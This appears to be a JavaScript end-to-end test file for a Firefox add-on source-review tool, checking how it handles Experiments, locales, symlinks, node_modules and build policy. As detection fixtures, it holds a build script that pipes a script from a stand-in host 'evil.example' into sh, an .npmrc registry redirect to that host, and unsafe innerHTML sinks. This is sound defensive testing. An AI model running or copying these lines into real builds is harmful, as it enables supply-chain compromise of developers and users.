    // the XPI's own content script, so the exposure is needed - no false finding.
    assert.ok(
      !has(findings, "minimize-web-accessible-resources"),
      "injected.js is loaded by the shipped content script - no WAR finding"
    );

    assert.equal(result.meta.reviewed, true);
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: --sca-experiments excludes the Experiment subtree from the code checks", async () => {
  const xpi = tmpDir(EXPERIMENT_XPI_FILES);
  // Source carries a privileged Experiment file (ChromeUtils) under experiments/.
  const src = tmpDir({
    ...SRC_FILES,
    "src/experiments/exp.js": `ChromeUtils.importESModule("resource:///x.sys.mjs");\n`,
  });
  try {
    const base = {
      addonPath: xpi,
      allowExperiments: true,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    };
    // With the flag - a folder inside --sca-extracted - the experiment subtree is
    // excluded, no false positive on its privileged code, while the real defect in main.js
    // is still caught.
    const withExp = await runReview({
      ...base,
      scaExtracted: src,
      scaHints: { experiments: "src/experiments" },
    });
    assert.ok(
      !has(
        withExp.findings,
        "core-symbol-in-webext",
        (f) => f.file === "src/experiments/exp.js"
      ),
      "with --sca-experiments the experiment subtree is excluded"
    );
    assert.ok(
      hasItem(withExp.meta, "unknown-api", (m) => m.file === "src/main.js"),
      "the WebExtension code is still reviewed with --sca-experiments"
    );

    // What a source flag may NOT name is a folder outside --sca-extracted: that one sits on
    // the reviewing machine and is not the submission's. The command line approves the
    // folders before the source is copied (approveScaFolders), and rejects this one.
    fs.mkdirSync(path.join(xpi, "experiments"));
    assert.throws(
      () =>
        approveScaFolders(src, { experiments: path.join(xpi, "experiments") }),
      (err) =>
        err instanceof ScaFoldersRejected &&
        err.which === "experiments" &&
        err.problem === "outside"
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// The archive cannot say which of its folders holds the Experiment, so a source review of
// an add-on that ships one does not start until --sca-experiments names it - otherwise its
// privileged code would be reviewed, and rejected, as WebExtension code.
test("SCA e2e: an Experiment add-on needs --sca-experiments", async () => {
  const manifest = JSON.parse(XPI_FILES["manifest.json"]);
  const xpi = tmpDir({
    ...XPI_FILES,
    "manifest.json": JSON.stringify({
      ...manifest,
      experiment_apis: { myapi: {} },
    }),
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/experiments/exp.js": `ChromeUtils.importESModule("resource:///x.sys.mjs");\n`,
  });
  try {
    const base = {
      addonPath: xpi,
      scaExtracted: src,
      allowExperiments: true,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    };
    // The command line holds the approved folders against the shipped manifest before the
    // source is copied (scaFoldersMisfit): without the Experiment folder it is refused.
    const none = approveScaFolders(src, {});
    assert.ok(scaFoldersMisfit(none, true).includes("--sca-experiments"));
    const named = approveScaFolders(src, {
      experiments: path.join(src, "src", "experiments"),
    });
    assert.deepEqual(named, { experiments: "src/experiments" });
    assert.equal(scaFoldersMisfit(named, true), null);
    const review = await runReview({ ...base, scaHints: named });
    assert.ok(review.findings, "with the folder named the review runs");
    // The other way round, a folder named for an add-on without Experiments is refused: it
    // would take WebExtension code out of the review.
    assert.ok(
      scaFoldersMisfit(named, false).includes("declares no Experiments")
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: --sca-experiments may sit beside the add-on code under --sca-package-root", async () => {
  const xpi = tmpDir(EXPERIMENT_XPI_FILES);
  // The Experiment lives OUTSIDE the review source (src/), as a sibling under --sca-package-root:
  // a valid layout, and the one a "must be a folder within the add-on" rule would refuse.
  const src = tmpDir({
    ...SRC_FILES,
    "experiment/exp.js": `ChromeUtils.importESModule("resource:///x.sys.mjs");\n`,
  });
  try {
    const base = {
      addonPath: xpi,
      allowExperiments: true,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    };
    // Accepted when the sibling folder sits anywhere under --sca-extracted.
    for (const experiments of [path.join(src, "experiment")]) {
      const hints = approveScaFolders(src, { experiments });
      const res = await runReview({
        ...base,
        scaExtracted: src,
        scaHints: hints,
      });
      // The review source is still reviewed...
      assert.ok(
        hasItem(res.meta, "unknown-api", (m) => m.file === "src/main.js"),
        "the WebExtension source is reviewed with a sibling --sca-experiments"
      );
      // ...and the out-of-source Experiment is never reviewed as WebExtension code (it is
      // partitioned into its own view, so nothing false-positives on ChromeUtils).
      assert.ok(
        !has(res.findings, "core-symbol-in-webext"),
        "the sibling Experiment is not reviewed as WebExtension code"
      );
    }
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: unused-files flags the build's dead files, not source scaffolding", async () => {
  // The XPI ships a file no entry point reaches; the source repo has its own
  // unreferenced scaffolding that never ships.
  const xpi = tmpDir({
    ...XPI_FILES,
    "orphan.js": `console.log("dead weight in the build");`,
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/leftover-config.js": `console.log("unreferenced source scaffolding");`,
  });
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    // unused-files describes the SHIPPED artifact: the XPI's dead file is flagged...
    assert.ok(
      has(findings, "unused-files", (f) => f.file === "orphan.js"),
      "expected the XPI's dead file to be flagged"
    );
    // ...but the source repo's unreferenced scaffolding never ships, so it is not.
    assert.ok(
      !findings.some((f) => f.file === "leftover-config.js"),
      "source-repo scaffolding must not be flagged in SCA"
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: locale checks evaluate _locales against the XPI, not the source", async () => {
  // The XPI ships _locales/en (as a build would); the readable source tree does
  // not (generated by the build, so an archive need not hold them).
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"name":{"message":"L"}}`,
  });
  const src = tmpDir(SRC_FILES); // no _locales in the source
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    // The shipped XPI satisfies default_locale, so there is no false reject - even
    // though the source has no _locales directory.
    assert.ok(
      !has(findings, "default-locale-unused"),
      "default_locale must be checked against the XPI's _locales, not the source"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCA e2e: missing-english-localization checks the XPI's _locales, not source text", async () => {
  // The shipped XPI ships an English locale; the source has no _locales and its
  // visible text is German. The check must see the XPI's English locale and pass,
  // not language-detect the source text and falsely flag a non-English add-on.
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"name":{"message":"L"}}`,
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/popup.html": `<html><body><h1>Willkommen bei unserer Erweiterung</h1><p>Diese Anwendung verwaltet Ihre Nachrichten und Einstellungen sorgfaeltig und zuverlaessig.</p></body></html>`,
  });
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(
      !has(findings, "missing-english-localization"),
      "the XPI's English _locales must satisfy the check, not the German source text"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCA e2e: background-module judges the XPI's background script, not the ESM source", async () => {
  const manifest = JSON.stringify({
    manifest_version: 3,
    name: "B",
    version: "1.0",
    background: { scripts: ["background.js"] }, // no type: module
  });
  // (a) The source uses ESM, but the build bundles it to a CLASSIC shipped script,
  // so the manifest.json correctly omits type:module. Reading the source would
  // false-positive; reading the shipped classic script does not.
  const xpiClassic = tmpDir({
    "manifest.json": manifest,
    "background.js": `(function () { console.log("bundled classic"); })();`,
  });
  const srcEsm = tmpDir({
    "package.json": SRC_FILES["package.json"],
    "package-lock.json": SRC_FILES["package-lock.json"],
    "src/background.js": `import { x } from "./util.js";\nconsole.log(x);`,
    "src/util.js": `export const x = 1;`,
  });
  // (b) The shipped script genuinely IS ESM (e.g. a rollup --format es bundle) with
  // no type:module - a real loading defect the check must still catch over the XPI.
  const xpiEsm = tmpDir({
    "manifest.json": manifest,
    "background.js": `import { x } from "./util.js";\nconsole.log(x);`,
    "util.js": `export const x = 1;`,
  });
  try {
    const a = await runReview({
      addonPath: xpiClassic,
      scaExtracted: srcEsm,
      ...OFFLINE,
    });
    assert.ok(
      !has(a.findings, "background-module"),
      "an ESM source bundled to a classic shipped script must not false-positive"
    );
    const b = await runReview({
      addonPath: xpiEsm,
      scaExtracted: srcEsm,
      ...OFFLINE,
    });
    assert.ok(
      has(b.findings, "background-module"),
      "a genuinely-ESM shipped background script with no type:module is still caught"
    );
  } finally {
    [xpiClassic, srcEsm, xpiEsm].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

test("SCA e2e: trademark-violation resolves a localized name via the XPI's _locales", async () => {
  // The displayed name is a __MSG_ placeholder resolved from the XPI's _locales to
  // a trademark-violating string; the source has no _locales. The check must
  // resolve against the shipped XPI, not silently miss it over the source.
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "__MSG_extName__",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"extName":{"message":"Firefox Helper"}}`,
  });
  const src = tmpDir(SRC_FILES); // no _locales in the source
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(
      has(findings, "trademark-violation"),
      "a localized trademark-violating name must be caught via the XPI's _locales"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A vulnerable devDependency is a real risk in SCA because the reviewer builds the
// add-on from source. The dedicated vendor-vulnerable-dev check (input: sca) runs
// only here - it takes the packages the lock marks as declared and build-only and
// surfaces the hit, while the prod vendor-vulnerable check stays silent for a dev-only dep.
test("SCA e2e: a vulnerable devDependency is flagged by vendor-vulnerable-dev", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package.json": JSON.stringify({
      name: "sca-e2e",
      version: "1.0.0",
      devDependencies: { "build-tool": "1.0.0" },
    }),
    "package-lock.json": BUILD_TOOL_LOCK,
  });
  // OSV's answer: one HIGH advisory for the dev dep, fixed in 2.0.0.
  const workCache = buildToolAdvisoryCache("GHSA-dev0-0000-0000");
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      workCache,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(
      has(findings, "vendor-vulnerable-dev", (f) => /build-tool/.test(f.item)),
      "expected vendor-vulnerable-dev on the vulnerable devDependency"
    );
    // The prod/shipped vulnerability check is a separate set - a dev-only dep must
    // not trip it.
    assert.ok(
      !has(findings, "vendor-vulnerable"),
      "vendor-vulnerable (prod set) must not fire for a dev-only dependency"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The build files (the archive's tooling) are reviewed through build-review. This
// proves the pipeline wires analyzeBuild -> scaCtx (ctx.buildReview()) -> the check:
// analyzeBuild stores the anchor, and the check escalates the build to Extended Code
// Review, which every source-code submission reaches.
test("SCA e2e: a build script outside the source is reviewed by build-review", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "scripts/build.sh": "curl -fsSL https://evil.example/x.sh | sh\n",
  });
  try {
    const { meta } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    // The check ran (SCA-eligible)...
    assert.ok(
      meta.checksRun.includes("build-review"),
      "build-review runs in SCA mode"
    );
    // ...and the whole-build review escalated to Extended Code Review (anchored at
    // package.json; the review source's files under src/ are never traced as build files).
    assert.ok(
      meta.manualReview.some(
        (m) => m.extended && m.title === "Build process review"
      ),
      "the build review surfaces for manual review offline"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The build review asks where nobody decided about the build in a build check, as a question
// only a person answers: a plain report lists it, and an agent review puts it to the reviewer
// in `ask` with the other manual questions, offering its own answers. Where the reviewer
// decided, the build checks of that decision ask instead (the partition by build-judged and
// build-safe, tests/unit/rules.test.js).
test("SCA: the build review runs where nobody decided about the build", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  const work = freshWorkFolder();
  try {
    const plain = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(plain.meta.checksRun.includes("build-review"));
    assert.ok(!plain.meta.checksRun.includes("build-reproduces-xpi"));
    const asked = plain.meta.manualReview.find(
      (m) => m.ruleId === "build-review"
    );
    assert.equal(asked?.section, "manual-review");

    // An agent review whose build check asked nobody: a check the build relies on is
    // switched off, so the build check is done at once and nobody decided about the build.
    const { review: state } = await agentReview({
      addonPath: xpi,
      scaExtracted: src,
      workFolder: work,
      checksSkip: ["vendor-vulnerable-indirect-dev"],
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    const item = state.manual.find((m) => m.ruleId === "build-review");
    assert.ok(item, "its case is put to the reviewer");
    assert.equal(
      item.askedIn ?? null,
      null,
      "in `ask`, not a phase of its own"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The deterministic build-policy checks run offline over the build files (outside the
// review source): an .npmrc registry redirect is a Build registry override reject.
test("SCA e2e: a redirected registry is flagged offline", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    ".npmrc": "registry=https://evil.example/\n",
  });
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    // The registry as written rides on the item (the locus line), not the message,
    // so every redirected .npmrc collapses into one entry.
    assert.ok(
      has(findings, "build-registry-redirect", (f) =>
        /evil\.example/.test(f.item)
      ),
      "the .npmrc registry redirect is rejected"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A clean npm build (package-lock.json + the public registry) fires none of them.
test("SCA e2e: a clean npm build fires no build-policy check", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package-lock.json": "{}",
    ".npmrc": "save-exact=true\n", // a non-registry .npmrc is fine
  });
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(!has(findings, "build-registry-redirect"));
    assert.ok(!has(findings, "committed-node-modules"));
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// Framework/TypeScript source (.ts/.tsx and .vue SFCs) is authored code the SCA
// review must analyze - a compiled XPI never contains it, so it is reviewed only
// here. Each file carries a real defect the code checks must catch, proving the
// source is parsed (TS/JSX) and, for the SFC, that its <script> and its v-html
// template binding are both scanned.
test("SCA e2e: TypeScript and Vue source is parsed and its defects are caught", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    // .ts with a type annotation: a fake API. If TS did not parse, the file would
    // fatal and no API usage would resolve - so unknown-api firing proves parsing.
    "src/api.ts": `const n: number = 1;\nbrowser.totallyFakeNamespace.doThing(n);\n`,
    // .tsx React component writing to an innerHTML sink.
    "src/Widget.tsx": `export const W = () => {\n  document.body.innerHTML = props.raw;\n  return <div/>;\n};\n`,
    // .vue SFC: a v-html template binding (an innerHTML-equivalent sink).
    "src/Comp.vue": `<script setup lang="ts">\nconst raw: string = get();\n</script>\n\n<template>\n  <div v-html="raw"></div>\n</template>\n`,
  });
  try {
    const { findings, meta } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    // (1) The .ts file is parsed and API-resolved.
    assert.ok(
      hasItem(
        meta,
        "unknown-api",
        (m) => m.file === "src/api.ts" && /totallyFakeNamespace/.test(m.item)
      ),
      "the .ts source is parsed and its fake API is flagged"
    );
    // (2) The .tsx file's innerHTML sink is caught (JSX parsed, sink scanned).
    assert.ok(
      has(findings, "unsafe-html", (f) => f.file === "src/Widget.tsx"),
      "the .tsx innerHTML sink is flagged"
    );
    // (3) The .vue SFC's v-html template binding is caught as an innerHTML sink.
    assert.ok(
      has(findings, "unsafe-html", (f) => f.file === "src/Comp.vue"),
      "the .vue v-html binding is flagged as an HTML sink"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A minified file in the readable source is a hard reject in SCA: a source code
// archive's promise is readable source, so minified-code fires on it exactly as it
// would for a built XPI - it is never scanned as authored code.
test("SCA e2e: a minified file in the source is rejected by minified-code", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    // One long line >= 1024 bytes packing many statements -> minified, not a known library.
    "src/blob.min.js": `var s=0;${"s=s+1;".repeat(240)}`,
  });
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    // The flat layout: the source IS the root, so the file keeps its path in the archive.
    assert.ok(
      has(findings, "minified-code", (f) => f.file === "src/blob.min.js"),
      "a minified source file is rejected by minified-code in SCA"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A package.json install lifecycle hook runs when the reviewer installs the declared
// dependencies, before the build - a supply-chain vector build-lifecycle-hook finds
// offline. Only the command says whether it is legitimate, so the hook
// escalates for a reviewer to read rather than being asserted as a finding: it must
// reach the manual-review list AND stay out of the findings the upload filter reads.
test("SCA e2e: a package.json install hook escalates to a reviewer", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package.json": JSON.stringify({
      name: "sca-e2e",
      version: "1.0.0",
      scripts: { postinstall: "node scripts/setup.js", build: "webpack" },
    }),
  });
  try {
    const { findings, meta } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(
      meta.manualReview.some(
        (m) => m.title === "Build install hook" && /postinstall/.test(m.item)
      ),
      "the postinstall install hook reaches the reviewer"
    );
    assert.ok(
      !has(findings, "build-lifecycle-hook"),
      "and carries nothing into the findings the upload filter reads"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A committed built archive (.xpi/.zip) anywhere in --sca-package-root is a hard reject, caught at
// load like node_modules - so an archive in the build tree AND one inside the review source
// both fire, regardless of the source/build split.
test("SCA e2e: a committed build archive is rejected anywhere in --sca-package-root", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "conversations.xpi": "BUILT ARTIFACT AT ROOT", // build tree (outside src/)
    "src/vendor/lib.zip": "ARCHIVE IN THE REVIEW SOURCE", // inside the archive
  });
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(
      has(
        findings,
        "committed-build-artifact",
        (f) => f.file === "conversations.xpi"
      ),
      "the committed .xpi in the build tree is flagged"
    );
    assert.ok(
      has(
        findings,
        "committed-build-artifact",
        (f) => f.file === "src/vendor/lib.zip"
      ),
      "an archive inside the review source is flagged too (loader spans all of --sca-package-root)"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A committed node_modules folder in --sca-package-root is a hard fail, and the ONLY check that
// may act on it: its contents are never read (loadAddon records the directory and does not
// walk it), so nothing else in the review can have an opinion about what is in there. The
// planted eval is the probe for that - it would be reported anywhere else in the
// submission, and here nothing may name it.
test("SCA e2e: a committed node_modules folder is rejected, and never inspected", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "node_modules/left-pad/index.js":
      'function f() { return eval("1 + 1"); }\n',
  });
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(
      has(findings, "committed-node-modules", (f) =>
        /node_modules/.test(f.message)
      ),
      "a committed node_modules folder is flagged"
    );
    assert.deepEqual(
      findings
        .filter((f) => /node_modules/.test(f.file ?? ""))
        .map((f) => f.ruleId),
      ["committed-node-modules"],
      "and nothing else in the review names anything under it"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A SYMLINK named node_modules is that same committed tree, so it is answered once, on the
// one axis that owns it. It is deliberately not a symlink record: the link check must not
// also speak, or one committed tree would draw two findings saying different things.
test("SCA e2e: a symlinked node_modules is answered once, as a committed tree", async () => {
  const xpi = tmpDir(XPI_FILES);
  const outside = tmpDir({
    "installed/left-pad/index.js": "module.exports = 1;\n",
  });
  const src = tmpDir(SRC_FILES);
  fs.symlinkSync(
    path.join(outside, "installed"),
    path.join(src, "node_modules"),
    "dir"
  );
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.deepEqual(
      findings.filter((f) => f.file === "node_modules").map((f) => f.ruleId),
      ["committed-node-modules"],
      "exactly one check answers it, and it is the one that owns installed trees"
    );
  } finally {
    [xpi, src, outside].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

// A symbolic link in --sca-package-root that leaves the submission is a hard fail: it is never
// followed, so whatever it names is outside everything the review reads and the build would compile code
// no review covered. A link WITHIN the submission stays ordinary layout - its target is
// walked under its own real path - so it is narrated and never reported.
test("SCA e2e: a symlink leaving --sca-package-root is rejected, one staying inside is not", async () => {
  const xpi = tmpDir(XPI_FILES);
  const outside = tmpDir({ "secret/payload.js": "exfiltrate();\n" });
  const src = tmpDir({ ...SRC_FILES, "src/inner/real.js": "const x = 1;\n" });
  fs.symlinkSync(
    path.join(outside, "secret"),
    path.join(src, "outward"),
    "dir"
  );
  fs.symlinkSync("src/inner", path.join(src, "intree"), "dir");
  try {
    const { findings } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.ok(
      has(
        findings,
        "sca-invalid-symlink",
        (f) =>
          f.file === "outward" && f.hint === "target outside the submission"
      ),
      "the escaping link is flagged, and its locus says why"
    );
    assert.ok(
      !has(findings, "sca-invalid-symlink", (f) => f.file === "intree"),
      "a link inside the submission is not a finding"
    );
  } finally {
    [xpi, src, outside].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

// The add-on half of the pair, in an SCA review: the built XPI holds links to the stricter
// standard. The shape the source archive may carry (a link INSIDE it) refuses the XPI at
// load, before either artifact is reviewed.
test("SCA e2e: a link inside the add-on refuses the XPI", async () => {
  const xpi = tmpDir({ ...XPI_FILES, "lib/real.js": "const y = 2;\n" });
  fs.symlinkSync("lib/real.js", path.join(xpi, "alias.js"));
  const src = tmpDir(SRC_FILES);
  fs.symlinkSync("src", path.join(src, "intree"), "dir");
  try {
    await assert.rejects(
      runReview({
        addonPath: xpi,
        scaExtracted: src,
        ...OFFLINE,
      }),
      {
        message:
          "Invalid XPI: alias.js is a symbolic link (an add-on must contain regular files only).",
      }
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A readable built XPI (no minified/obfuscated first-party code) makes a --sca-package-root
// submission a false SCA: the shipped add-on can be reviewed directly, so its source
// archive adds nothing. The review stays an SCA review, and the submission-shape checks
// say so: sca-xpi-fully-included-in-archive when the archive holds every shipped byte,
// sca-xpi-declares-vendoring when the XPI ships a declaration that belongs in the archive.
const READABLE_XPI = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "Readable XPI",
    version: "1.0",
    background: { scripts: ["background.js"] },
  }),
  "background.js": `console.log("readable shipped code");`,
};

// The two ways a submission says it did not need to be one, end to end. Neither changes the
// MODE: a source submission is always reviewed as a source submission.
test("SCA e2e: the two submission-shape checks fire independently", async () => {
  const xpi = tmpDir(READABLE_XPI);
  const base = {
    "package.json": JSON.stringify({ name: "tr", version: "1.0.0" }),
    // A source archive owes a lock whatever its package.json declares - without one this
    // would test the lock rule rather than the question it is about.
    "package-lock.json": JSON.stringify({
      lockfileVersion: 3,
      packages: { "": {} },
    }),
    "src/manifest.json": READABLE_XPI["manifest.json"],
    // Byte-identical to the shipped script. A lookalike literal would silently fail this.
    "src/background.js": READABLE_XPI["background.js"],
  };
  const twinned = tmpDir(base);
  // The same archive, except the shipped script was BUILT from something else: nothing in
  // the archive matches its bytes, so the comparison finds no twin.
  const built = tmpDir({
    ...base,
    "src/background.js": `console.log("pre-build source");`,
  });
  // Built bytes again, but this time the XPI carries a package.json of its own - which in a
  // source submission belongs in the archive. That alone warns, twin or no twin.
  const xpiWithDeclaration = tmpDir({
    ...READABLE_XPI,
    "background.js": `console.log("built output");`,
    "package.json": JSON.stringify({ name: "shipped", version: "1.0.0" }),
  });
  try {
    const a = await runReview({
      addonPath: xpi,
      scaExtracted: twinned,
      ...OFFLINE,
    });
    assert.equal(a.mode, REVIEW_MODE.SCA, "the review is never re-routed");
    assert.ok(
      has(a.findings, "sca-xpi-fully-included-in-archive"),
      "every shipped byte is readable in the archive"
    );
    assert.ok(
      !has(a.findings, "sca-xpi-declares-vendoring"),
      "the declarations are in the ARCHIVE, which is where they belong"
    );

    const b = await runReview({
      addonPath: xpi,
      scaExtracted: built,
      ...OFFLINE,
    });
    assert.equal(b.mode, REVIEW_MODE.SCA, "still a source review, as always");
    assert.ok(
      !has(b.findings, "sca-xpi-fully-included-in-archive"),
      "a shipped file that was built has no twin, and the archive is needed"
    );

    const c = await runReview({
      addonPath: xpiWithDeclaration,
      scaExtracted: built,
      ...OFFLINE,
    });
    assert.ok(
      has(c.findings, "sca-xpi-declares-vendoring"),
      "vendoring information in the XPI warns on its own"
    );
    assert.ok(
      !has(c.findings, "sca-xpi-fully-included-in-archive"),
      "its shipped script was built, so the archive does not hold the XPI"
    );
  } finally {
    [xpi, twinned, built, xpiWithDeclaration].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

test("SCA e2e: an archive holding the whole XPI is reported, and the rest of the review runs", async () => {
  const xpi = tmpDir(READABLE_XPI);
  // Every shipped file is byte-identical here, so the archive holds the whole XPI and the
  // check fires. The source ALSO carries a fake API in a file the XPI lacks: unknown-api
  // reporting it is what proves the rejection ends the review late, after every check ran.
  const src = tmpDir({
    "package.json": JSON.stringify({
      name: "dg",
      version: "1.0.0",
      scripts: { build: "cp -r node_modules/lib dist" },
    }),
    // A source archive owes a lock whatever its package.json declares - without one this
    // would report the lock rule instead of the rule the test is about.
    "package-lock.json": JSON.stringify({
      lockfileVersion: 3,
      packages: { "": {} },
    }),
    "background.js": READABLE_XPI["background.js"],
    "manifest.json": READABLE_XPI["manifest.json"],
    "only-in-source.js": `browser.totallyFakeNamespace.doThing();\n`,
  });
  try {
    const result = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    const { findings, mode } = result;
    assert.equal(
      mode,
      REVIEW_MODE.SCA,
      "this never re-routes the review - an SCA submission stays SCA"
    );
    assert.ok(
      has(findings, "sca-xpi-fully-included-in-archive"),
      "the archive holding every shipped byte is reported"
    );
    assert.deepEqual(
      result.meta.earlyExit?.reasons.map((r) => r.id),
      ["archive-is-xpi"],
      "the rejection ends the review"
    );
    assert.ok(
      hasItem(result.meta, "unknown-api") || has(findings, "unknown-api"),
      "the checks after the rejection run"
    );
    // Lock the rendered entry: it must explain the cost of the source-archive route,
    // and it must carry NO locus line - every shipped file is the subject, so naming one
    // would name the whole XPI.
    const body = formatText(result);
    // Located by the REGISTRY's own text, not by a phrase copied here: the wording is the
    // registry's to change, and a copy of it only ever breaks. What this pins is that the
    // entry renders at all, and that it still presses the case - not how it is worded.
    const advice = loadRegistry()
      .checkEntry("sca-xpi-fully-included-in-archive")
      .response.trim();
    // The response is more than one line (it ends in a Read more:), and each of its lines
    // renders as one, so the locus would sit after the LAST of them.
    const adviceLines = advice.split("\n");
    assert.match(
      advice,
      /faster/i,
      "the advice presses the case: the XPI-only route is faster"
    );
    const lines = body.split("\n");
    const entry = lines.findIndex((l) => l.includes(adviceLines[0]));
    assert.ok(entry >= 0, "the entry is rendered");
    assert.equal(
      lines[entry + adviceLines.length].trim(),
      "",
      "the entry is followed by a blank line, not a locus"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// An archive that is the XPI itself, with no package.json: both are true of it, and both
// abort the review late, so the developer is told both in one round.
